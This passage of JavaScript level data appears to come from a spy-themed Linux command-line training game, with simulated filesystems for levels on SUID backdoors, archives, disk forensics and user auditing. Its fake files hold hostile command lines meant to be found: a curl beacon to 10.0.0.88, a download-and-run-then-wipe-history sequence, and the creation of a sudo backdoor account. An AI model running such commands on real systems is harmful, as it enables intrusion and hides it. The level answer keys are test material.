                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
                    children: ['classified_docs.tar.gz']
                },
                '/home/mole/.local': {
                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
                    children: ['pwn']
                },
                '/home/mole/.local/pwn': {
                    type: 'file', perms: '-rwsr-xr-x', owner: 'root', group: 'root', size: 8192,
                    content: '[SUID BINARY - Privilege escalation backdoor]'
                },
                '/tmp': {
                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
                    children: ['.cache', '.hidden', 'beacon.sh']
                },
                '/tmp/.cache': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['rootshell']
                },
                '/tmp/.cache/rootshell': {
                    type: 'file', perms: '-rwsr-xr-x', owner: 'root', group: 'root', size: 16384,
                    content: '[SUID BACKDOOR in /tmp - HIGHLY SUSPICIOUS]'
                },
                '/tmp/.hidden': {
                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
                    children: ['exfil.tar', 'keylogger']
                },
                '/tmp/beacon.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'mole', group: 'mole', size: 256,
                    content: '#!/bin/bash\nwhile true; do curl -s http://10.0.0.88/beacon; sleep 300; done'
                },
                '/var/tmp': {
                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
                    children: ['privesc']
                },
                '/var/tmp/privesc': {
                    type: 'file', perms: '-rwsr-xr-x', owner: 'root', group: 'root', size: 4096,
                    content: '[PRIVILEGE ESCALATION TOOL]'
                },
            },

            objectives: [
                { id: 1, task: 'HUNT: Hidden Dot-Files', hint: '$ find /home -name ".*" -type f',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-name') && cmd.includes('.*') &&
                         output && (output.includes('.') || output.includes('No matches'))  },
                { id: 2, task: 'LOCATE: SUID Backdoors', hint: '$ find / -perm -4000 2>/dev/null',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('4000') &&
                         output && (output.includes('rws') || output.includes('/')) },
                { id: 3, task: 'SEARCH: Temp Directory Drops', hint: '$ find /tmp -type f',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('/tmp') &&
                         output && (output.includes('/tmp') || output.includes('beacon') || output.includes('No matches')) },
                { id: 4, task: 'TRACK: Recent Modifications', hint: '$ find / -mtime -1 -type f 2>/dev/null',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-mtime') },
                { id: 5, task: 'VERIFY: Binary Locations', hint: '$ which sudo && whereis bash',
                  check: (cmd, state, output) => (cmd.includes('which') || cmd.includes('whereis')) &&
                         output && output.includes('/') },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "What port does the analyst's backdoor connect to?",
                acceptedAnswers: ["4444", "port 4444", "4444."],
                hint: "Read the .backdoor.sh file in /home/analyst to see the C2 connection details.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Port not confirmed. Check the backdoor script for netcat parameters.",
                correctAnswerMessage: "C2 PORT CONFIRMED: 4444. Mole's communication channel identified."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-018: Archive Operations
        // Theme: Dead drop - extracting and packaging intel
        // ──────────────────────────────────────────────────────────
        'CLH-018': {
            title: 'Archive Operations',
            description: 'Extract intel packages from dead drops and prepare them for exfiltration.',
            prerequisites: ['CLH-017'],
            tier: 'CLI Specter',
            user: 'courier',
            hostname: 'DEAD-DROP',
            startDir: '/home/courier',
            allowedCommands: null,

            filesystem: {
                '/home/courier': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['incoming', 'outgoing', 'staging', 'logs', '.bash_history', '.archive_cheatsheet']
                },
                '/home/courier/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'courier', group: 'courier', size: 256,
                    content: `ls -la incoming/
tar -tzf incoming/package_alpha.tar.gz
tar -xzf archive.tar.gz -C /destination/
tar -czf output.tar.gz source_dir/
gzip -t file.tar.gz
md5sum file.tar.gz`
                },
                '/home/courier/.archive_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 789,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          ARCHIVE OPERATIONS CHEATSHEET                        ║
╚═══════════════════════════════════════════════════════════════╝

TAR OPERATIONS
──────────────
tar -czf archive.tar.gz dir/    Create gzipped tarball
tar -xzf archive.tar.gz         Extract gzipped tarball
tar -tzf archive.tar.gz         List contents (don't extract)
tar -xzf archive.tar.gz -C dir/ Extract to specific directory

COMPRESSION
───────────
gzip file                       Compress file (replaces original)
gunzip file.gz                  Decompress file
gzip -t file.gz                 Test integrity
gzip -l file.gz                 List compression info

ZIP OPERATIONS
─────────────
zip -r archive.zip dir/         Create zip archive
unzip archive.zip               Extract zip
unzip -l archive.zip            List contents

INTEGRITY CHECKS
───────────────
md5sum file                     Generate MD5 hash
sha256sum file                  Generate SHA256 hash
md5sum -c checksums.md5         Verify against checksum file`
                },
                '/home/courier/incoming': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['package_alpha.tar.gz', 'package_beta.zip', 'encrypted_bundle.tar.gpg', 'README.txt']
                },
                '/home/courier/incoming/package_alpha.tar.gz': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 2097152,
                    content: '[COMPRESSED ARCHIVE - tar.gz format]\nContents: intel_report.pdf, asset_photos/, communications.log'
                },
                '/home/courier/incoming/package_beta.zip': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 1048576,
                    content: '[COMPRESSED ARCHIVE - zip format]\nContents: surveillance_photos/, target_profiles.xlsx'
                },
                '/home/courier/incoming/encrypted_bundle.tar.gpg': {
                    type: 'file', perms: '-rw-------', owner: 'courier', group: 'courier', size: 4194304,
                    content: '[GPG ENCRYPTED ARCHIVE - Requires handler key]\nPassword hint: Operation codename + year'
                },
                '/home/courier/incoming/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 312,
                    content: 'DEAD DROP INSTRUCTIONS\n======================\n1. Verify packages with checksums\n2. Extract to staging area\n3. Repackage for exfiltration\n4. Leave no traces\n\nHandler codename: RAVEN\nDrop schedule: 0300 UTC daily'
                },
                '/home/courier/outgoing': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['checksums.md5']
                },
                '/home/courier/outgoing/checksums.md5': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 128,
                    content: '# Outgoing package checksums\n# Generate with: md5sum file >> checksums.md5'
                },
                '/home/courier/staging': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['manifest.txt', 'priority.txt']
                },
                '/home/courier/staging/manifest.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 256,
                    content: 'DEAD DROP MANIFEST\n==================\nPackage Alpha: SIGINT intercepts\nPackage Beta: Asset photographs\nEncrypted Bundle: HUMINT reports\n\nPriority: ALPHA (extract first)\nHandler: RAVEN'
                },
                '/home/courier/staging/priority.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 178,
                    content: 'EXTRACTION PRIORITY\n===================\n1. package_alpha.tar.gz - SIGINT (HIGH)\n2. package_beta.zip - PHOTOS (MEDIUM)\n3. encrypted_bundle - HUMINT (HANDLER ONLY)'
                },
                '/home/courier/logs': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['transfer.log', 'activity.log']
                },
                '/home/courier/logs/transfer.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 456,
                    content: '2024-01-15 03:00 RECV package_alpha.tar.gz from DROP_01\n2024-01-15 03:02 RECV package_beta.zip from DROP_02\n2024-01-15 03:05 RECV encrypted_bundle.tar.gpg from DROP_03\n2024-01-15 03:10 VERIFY all packages intact'
                },
                '/home/courier/logs/activity.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 234,
                    content: 'Session started: 2024-01-15 03:00 UTC\nOperator: courier\nMission: DEAD DROP RETRIEVAL\nStatus: PACKAGES AWAITING PROCESSING'
                },
                '/var/dead-drops': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
                    children: ['drop_01', 'drop_02', 'drop_03']
                },
                '/var/dead-drops/drop_01': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
                    children: ['status.txt']
                },
                '/var/dead-drops/drop_01/status.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'courier', size: 89,
                    content: 'DROP 01 STATUS: CLEARED\nLast pickup: 2024-01-15 03:00 UTC\nNext scheduled: 2024-01-16 03:00 UTC'
                },
                '/var/dead-drops/drop_02': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
                    children: ['status.txt']
                },
                '/var/dead-drops/drop_02/status.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'courier', size: 89,
                    content: 'DROP 02 STATUS: CLEARED\nLast pickup: 2024-01-15 03:02 UTC\nNext scheduled: 2024-01-16 03:00 UTC'
                },
                '/var/dead-drops/drop_03': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
                    children: ['status.txt']
                },
                '/var/dead-drops/drop_03/status.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'courier', size: 89,
                    content: 'DROP 03 STATUS: CLEARED\nLast pickup: 2024-01-15 03:05 UTC\nNext scheduled: 2024-01-16 03:00 UTC'
                },
            },

            objectives: [
                { id: 1, task: 'LIST: Incoming Packages', hint: '$ ls -la incoming/',
                  check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('incoming') &&
                         output && (output.includes('package_alpha') || output.includes('tar.gz')) },
                { id: 2, task: 'INSPECT: Archive Contents', hint: '$ tar -tzf incoming/package_alpha.tar.gz',
                  check: (cmd, state, output) => cmd.includes('tar') && (cmd.includes('-t') || cmd.includes('--list')) &&
                         output && (output.includes('intel') || output.includes('Contents')) },
                { id: 3, task: 'EXTRACT: Intel Package', hint: '$ tar -xzf incoming/package_alpha.tar.gz -C staging/',
                  check: (cmd, state, output) => cmd.includes('tar') && (cmd.includes('-x') || cmd.includes('--extract')) &&
                         output && (output.includes('Extracted') || output.includes('staging')) },
                { id: 4, task: 'CREATE: Exfil Package', hint: '$ tar -czf outgoing/exfil.tar.gz staging/',
                  check: (cmd, state, output) => cmd.includes('tar') && (cmd.includes('-c') || cmd.includes('--create')) &&
                         output && (output.includes('Created') || output.includes('outgoing')) },
                { id: 5, task: 'VERIFY: Package Integrity', hint: '$ gzip -t outgoing/exfil.tar.gz',
                  check: (cmd, state, output) => ((cmd.includes('gzip') && cmd.includes('-t')) || cmd.includes('md5sum') || cmd.includes('sha256sum')) &&
                         output && (output.includes('OK') || output.includes('intact') || /[a-f0-9]{32}/.test(output)) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the handler's codename for this dead drop operation?",
                acceptedAnswers: ["raven", "RAVEN", "handler raven"],
                hint: "Check the manifest.txt or README.txt in the staging or incoming directories.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Handler not recognized. Review the drop documentation.",
                correctAnswerMessage: "HANDLER RAVEN CONFIRMED. Exfiltration authorized."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-019: Disk Forensics
        // Theme: Evidence lab - analyzing disk images
        // ──────────────────────────────────────────────────────────
        'CLH-019': {
            title: 'Disk Forensics',
            description: 'Analyze disk images in the forensics lab to extract evidence.',
            prerequisites: ['CLH-018'],
            tier: 'CLI Specter',
            user: 'forensics',
            hostname: 'EVIDENCE-LAB',
            startDir: '/home/forensics',
            allowedCommands: null,

            filesystem: {
                '/home/forensics': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['cases', 'tools', 'reports', '.bash_history', '.forensics_cheatsheet']
                },
                '/home/forensics/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'forensics', group: 'forensics', size: 234,
                    content: `df -h
lsblk
du -sh /mnt/evidence/*
find /mnt/evidence -size +1M -type f
grep -r "DELETED" /mnt/evidence/
file disk.img`
                },
                '/home/forensics/.forensics_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 856,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          DISK FORENSICS CHEATSHEET                            ║
╚═══════════════════════════════════════════════════════════════╝

DISK ANALYSIS
─────────────
df -h                           Show filesystem space usage
lsblk                           List block devices
fdisk -l                        Show partition tables
blkid                           Show block device attributes

SIZE ANALYSIS
────────────
du -sh /path                    Directory size (human readable)
du -sh /path/*                  Size of each item in directory
du -ah /path | sort -rh | head  Find largest files

FILE HUNTING
───────────
find /path -size +1M            Files larger than 1MB
find /path -size +100M          Files larger than 100MB
find /path -type f -name "*.log" Find by extension
find /path -mtime -7            Modified in last 7 days

CONTENT SEARCH
─────────────
grep -r "pattern" /path         Recursive search
grep -l "pattern" /path/*       List files containing pattern
strings file.img | grep -i pass Extract strings, find passwords

IMAGE ANALYSIS
─────────────
file image.img                  Identify file type
xxd image.img | head            Hex dump first bytes
mount -o loop image.img /mnt    Mount disk image`
                },
                '/home/forensics/cases': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['case_2024_001', 'case_2024_002']
                },
                '/home/forensics/cases/case_2024_001': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['disk.img', 'memory.dmp', 'notes.txt', 'chain_of_custody.txt']
                },
                '/home/forensics/cases/case_2024_001/disk.img': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 1073741824,
                    content: '[RAW DISK IMAGE - 1GB]\nAcquired: 2024-01-10 14:30 UTC\nMethod: dd if=/dev/sda of=disk.img\nHash: SHA256:a3f2b8c9d4e5f6...'
                },
                '/home/forensics/cases/case_2024_001/memory.dmp': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 4294967296,
                    content: '[MEMORY DUMP - 4GB]\nAcquired during live response\nContains process memory, network connections'
                },
                '/home/forensics/cases/case_2024_001/notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 512,
                    content: 'CASE 2024-001: Compromised Workstation\n=====================================\nSuspect: Unknown threat actor\nEvidence: Full disk image acquired\nObjective: Recover deleted files and timeline\nCase Officer: SPECTER\n'
                },
                '/home/forensics/cases/case_2024_001/chain_of_custody.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 345,
                    content: 'CHAIN OF CUSTODY\n================\n2024-01-10 14:30 - Image acquired by Field Agent FALCON\n2024-01-10 16:00 - Transferred to Evidence Lab\n2024-01-10 16:15 - Received by Analyst FORENSICS\n2024-01-10 16:30 - Mounted for analysis'
                },
                '/home/forensics/cases/case_2024_002': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['usb.img', 'notes.txt']
                },
                '/home/forensics/cases/case_2024_002/usb.img': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 16106127360,
                    content: '[USB DRIVE IMAGE - 16GB]\nSuspected exfiltration device'
                },
                '/home/forensics/cases/case_2024_002/notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 289,
                    content: 'CASE 2024-002: Insider Threat\n=============================\nSuspect: Former employee\nEvidence: USB drive found in desk\nObjective: Recover deleted documents'
                },
                '/home/forensics/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['recover.sh', 'timeline.py', 'hash_verify.sh']
                },
                '/home/forensics/tools/recover.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'forensics', group: 'forensics', size: 256,
                    content: '#!/bin/bash\n# File recovery script\necho "Scanning for deleted files..."\nfind /mnt/evidence -name "*.deleted" -o -name "*~"'
                },
                '/home/forensics/tools/timeline.py': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'forensics', group: 'forensics', size: 512,
                    content: '#!/usr/bin/env python3\n# Timeline generation tool\n# Usage: python timeline.py /mnt/evidence > timeline.csv'
                },
                '/home/forensics/tools/hash_verify.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'forensics', group: 'forensics', size: 178,
                    content: '#!/bin/bash\n# Verify evidence integrity\nsha256sum "$1"\necho "Compare with chain of custody hash"'
                },
                '/home/forensics/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['template.txt']
                },
                '/home/forensics/reports/template.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 234,
                    content: 'FORENSIC ANALYSIS REPORT\n========================\nCase Number: \nAnalyst: \nDate: \nEvidence Hash: \nFindings:\n\nConclusion:\n'
                },
                '/mnt': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['evidence']
                },
                '/mnt/evidence': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['home', 'var', 'tmp']
                },
                '/mnt/evidence/home': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['suspect']
                },
                '/mnt/evidence/home/suspect': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['.bash_history', 'Documents', 'Downloads']
                },
                '/mnt/evidence/home/suspect/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'forensics', size: 456,
                    content: 'curl -o /tmp/payload.sh http://10.0.0.88/mal.sh\nchmod +x /tmp/payload.sh\n/tmp/payload.sh\nrm -rf /tmp/payload.sh\nhistory -c'
                },
                '/mnt/evidence/home/suspect/Documents': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['DELETED_confidential.docx', 'meeting_notes.txt']
                },
                '/mnt/evidence/home/suspect/Documents/DELETED_confidential.docx': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'forensics', size: 524288,
                    content: '[DELETED FILE RECOVERED]\nClassified project documentation\nMarked for exfiltration'
                },
                '/mnt/evidence/home/suspect/Documents/meeting_notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'forensics', size: 234,
                    content: 'Meeting with handler: 2024-01-08\nDrop location: parking garage B3\nPayment: Bitcoin wallet provided'
                },
                '/mnt/evidence/var': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['log']
                },
                '/mnt/evidence/var/log': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['auth.log', 'syslog']
                },
                '/mnt/evidence/var/log/auth.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'forensics', size: 2048,
                    content: 'Jan 8 02:15:00 workstation sshd: Accepted password for suspect from 10.0.0.88\nJan 8 02:15:30 workstation sudo: suspect : TTY=pts/0 ; COMMAND=/bin/bash'
                },
                '/mnt/evidence/tmp': {
                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'forensics',
                    children: ['.hidden_cache']
                },
                '/mnt/evidence/tmp/.hidden_cache': {
                    type: 'dir', perms: 'drwx------', owner: 'root', group: 'forensics',
                    children: ['exfil_staging.tar.gz']
                },
                '/mnt/evidence/tmp/.hidden_cache/exfil_staging.tar.gz': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'forensics', size: 52428800,
                    content: '[LARGE FILE - 50MB]\nStaged for exfiltration\nContains classified documents'
                },
            },

            objectives: [
                { id: 1, task: 'SURVEY: Available Disk Space', hint: '$ df -h',
                  check: (cmd, state, output) => cmd.includes('df') &&
                         output && (output.includes('Filesystem') || output.includes('Size') || output.includes('/dev')) },
                { id: 2, task: 'LIST: Block Devices', hint: '$ lsblk',
                  check: (cmd, state, output) => cmd.includes('lsblk') &&
                         output && (output.includes('NAME') || output.includes('disk') || output.includes('sda')) },
                { id: 3, task: 'CHECK: Disk Usage', hint: '$ du -sh /mnt/evidence/*',
                  check: (cmd, state, output) => cmd.includes('du') && cmd.includes('evidence') &&
                         output && (/\d/.test(output) || output.includes('home') || output.includes('var')) },
                { id: 4, task: 'FIND: Large Files', hint: '$ find /mnt/evidence -size +1M -type f',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-size') &&
                         output && (output.includes('/mnt') || output.includes('evidence') || output.includes('No matches')) },
                { id: 5, task: 'SEARCH: Deleted Markers', hint: '$ grep -r "DELETED" /mnt/evidence/',
                  check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('evidence') &&
                         output && (output.includes('DELETED') || output.includes('confidential') || output.includes('No matches')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the case officer's codename for case 2024-001?",
                acceptedAnswers: ["specter", "SPECTER", "case officer specter"],
                hint: "Check the notes.txt file in the case_2024_001 directory.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Case officer not recognized. Review the case notes.",
                correctAnswerMessage: "CASE OFFICER SPECTER CONFIRMED. Evidence analysis authorized."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-020: User Reconnaissance
        // Theme: Profiling users on a compromised system
        // ──────────────────────────────────────────────────────────
        'CLH-020': {
            title: 'User Reconnaissance',
            description: 'Profile user accounts and privileges on a compromised system.',
            prerequisites: ['CLH-019'],
            tier: 'CLI Specter',
            user: 'auditor',
            hostname: 'BLACKSITE-7',
            startDir: '/home/auditor',
            allowedCommands: null,

            filesystem: {
                '/home/auditor': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
                    children: ['audit_logs', 'reports', 'notes', '.bash_history', '.user_recon_cheatsheet']
                },
                '/home/auditor/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'auditor', group: 'auditor', size: 234,
                    content: `whoami
id
cat /etc/passwd
grep sudo /etc/group
last
cat /etc/sudoers
sudo -l`
                },
                '/home/auditor/.user_recon_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 856,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          USER RECONNAISSANCE CHEATSHEET                       ║
╚═══════════════════════════════════════════════════════════════╝

IDENTITY
────────
whoami                      Current username
id                          UID, GID, and groups
hostname                    System hostname
uname -a                    Full system info

USER ENUMERATION
───────────────
cat /etc/passwd             All user accounts
cat /etc/shadow             Password hashes (need root)
cat /etc/group              All groups
getent passwd username      Specific user details

PRIVILEGE ANALYSIS
─────────────────
grep sudo /etc/group        Users in sudo group
cat /etc/sudoers            Sudo configuration
sudo -l                     Current user's sudo rights
find / -perm -4000          SUID binaries

LOGIN HISTORY
────────────
last                        Recent logins
lastlog                     Last login per user
who                         Currently logged in
w                           Logged in + activity

SUSPICIOUS INDICATORS
────────────────────
- New users created recently
- Users added to sudo/admin groups
- Users with UID 0 (root equivalent)
- Users with /bin/bash shell`
                },
                '/home/auditor/audit_logs': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
                    children: ['user_activity.log', 'privilege_changes.log']
                },
                '/home/auditor/audit_logs/user_activity.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 567,
                    content: `2024-01-14 02:30:15 admin logged in from 192.168.1.100
2024-01-14 02:31:00 admin executed: sudo useradd -m backdoor
2024-01-14 02:31:30 admin executed: sudo passwd backdoor
2024-01-14 02:32:00 admin executed: sudo usermod -aG sudo backdoor
2024-01-14 03:00:00 backdoor logged in from 10.0.0.88
2024-01-14 03:00:30 backdoor executed: sudo -i`
                },
                '/home/auditor/audit_logs/privilege_changes.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 345,
                    content: `PRIVILEGE ESCALATION EVENTS
============================
2024-01-14 02:32:00 USER backdoor ADDED TO GROUP sudo BY admin
2024-01-14 03:00:30 USER backdoor GAINED ROOT SHELL

ALERT: Unauthorized privilege escalation detected!`
                },
                '/home/auditor/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
                    children: ['template.txt']
                },
                '/home/auditor/reports/template.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 234,
                    content: 'USER AUDIT REPORT\n=================\nDate: \nAuditor: \nFindings:\n\nSuspicious Accounts:\n\nRecommendations:\n'
                },
                '/home/auditor/notes': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
                    children: ['investigation.txt']
                },
                '/home/auditor/notes/investigation.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'auditor', group: 'auditor', size: 378,
                    content: 'INVESTIGATION NOTES\n===================\nSuspect Account: backdoor\nCreated: 2024-01-14 02:31:00\nCreated By: admin (compromised?)\nPrivileges: sudo group member\nFirst Login: 2024-01-14 03:00:00 from 10.0.0.88\n\nACTION REQUIRED: Disable account and investigate admin'
                },
                '/home/admin': {
                    type: 'dir', perms: 'drwx------', owner: 'admin', group: 'admin',
                    children: ['.ssh', 'scripts', '.bash_history']
                },
                '/home/admin/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 1024,
                    content: 'sudo useradd -m backdoor\nsudo passwd backdoor\nsudo usermod -aG sudo backdoor\nhistory -c'
                },
                '/home/admin/.ssh': {
                    type: 'dir', perms: 'drwx------', owner: 'admin', group: 'admin',
                    children: ['authorized_keys']
                },
                '/home/admin/.ssh/authorized_keys': {
                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 512,
                    content: '# Authorized keys for admin\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... admin@workstation\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... UNKNOWN@10.0.0.88  # SUSPICIOUS'
                },
                '/home/admin/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['backup.sh']
                },
                '/home/admin/scripts/backup.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'admin', group: 'admin', size: 256,
                    content: '#!/bin/bash\n# System backup script\ntar -czf /backup/system_$(date +%Y%m%d).tar.gz /etc /home'
                },
                '/home/sysadmin': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'sysadmin', group: 'sysadmin',
                    children: ['.ssh', 'maintenance', '.bash_history']
                },
                '/home/sysadmin/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'sysadmin', group: 'sysadmin', size: 178,
                    content: 'systemctl status sshd\njournalctl -u sshd\ncat /var/log/auth.log'
                },
                '/home/sysadmin/maintenance': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'sysadmin', group: 'sysadmin',
                    children: ['health_check.sh']
                },
                '/home/sysadmin/maintenance/health_check.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'sysadmin', group: 'sysadmin', size: 312,
                    content: '#!/bin/bash\necho "=== SYSTEM HEALTH ==="\nuptime\nfree -h\ndf -h'
                },
                '/home/backdoor': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'backdoor', group: 'backdoor',
                    children: ['.bashrc', 'tools', '.bash_history']
                },
                '/home/backdoor/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'backdoor', group: 'backdoor', size: 456,
                    content: 'sudo -i\ncat /etc/shadow\nwhoami\nid\ncat /etc/passwd | grep root'
                },
                '/home/backdoor/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'backdoor', group: 'backdoor',
                    children: ['enum.sh']
                },
                '/home/backdoor/tools/enum.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'backdoor', group: 'backdoor', size: 289,
                    content: '#!/bin/bash\n# User enumeration script\necho "=== USERS ==="\ncat /etc/passwd\necho "=== SUDO USERS ==="\ngrep sudo /etc/group'
                },
            },

            objectives: [
                { id: 1, task: 'IDENTIFY: Current User', hint: '$ whoami && id',
                  check: (cmd, state, output) => (cmd.includes('whoami') || cmd.includes('id')) &&
                         output && (output.includes('auditor') || output.includes('uid=')) },
                { id: 2, task: 'LIST: All Users', hint: '$ cat /etc/passwd',
                  check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('passwd') &&
                         output && (output.includes('root') || output.includes('/bin/bash') || output.includes(':x:')) },
                { id: 3, task: 'FIND: Privileged Users', hint: '$ grep sudo /etc/group',
                  check: (cmd, state, output) => cmd.includes('grep') && (cmd.includes('sudo') || cmd.includes('group')) &&
                         output && (output.includes('sudo') || output.includes('backdoor') || output.includes('admin')) },
                { id: 4, task: 'CHECK: Login History', hint: '$ last',
                  check: (cmd, state, output) => (cmd.includes('last')) &&
                         output && (output.includes('pts') || output.includes('logged') || output.includes('still')) },
                { id: 5, task: 'AUDIT: Sudoers', hint: '$ cat /etc/sudoers 2>/dev/null || sudo -l',
                  check: (cmd, state, output) => (cmd.includes('sudoers') || cmd.includes('sudo -l')) &&
                         output && (output.includes('ALL') || output.includes('NOPASSWD') || output.includes('sudo')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the username of the suspicious account created by the attacker?",
                acceptedAnswers: ["backdoor", "user backdoor", "backdoor user"],
                hint: "Check the audit_logs directory or admin's bash_history for recently created accounts.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Account not found. Review the privilege_changes.log or user_activity.log.",
